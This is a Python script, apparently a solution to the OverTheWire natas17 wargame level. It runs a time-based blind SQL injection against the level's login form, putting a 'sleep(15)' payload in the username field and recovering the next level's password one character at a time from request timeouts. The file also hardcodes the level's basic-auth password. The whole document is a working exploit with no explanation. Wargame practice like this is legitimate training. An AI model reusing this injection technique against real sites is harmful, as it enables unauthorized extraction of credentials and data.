import requests

chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
password = ""
Url = "http://natas17.natas.labs.overthewire.org/index.php"
Basic_User = "natas17"
Basic_Pass = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

while len(password) <= 32 :
    for char in chars:
        print("testing: " +char )
        try:
            resp = requests.post(Url,data=
            {'username':f'natas18" and password like binary "{password}{char}%%" and sleep(15) -- '},
            auth=(Basic_User,Basic_Pass),timeout = 10 )
        except requests.exceptions.ReadTimeout:
            password += char
            print(password + " Len=" + str(len(password)))
            break
   
            
            

            
            
           
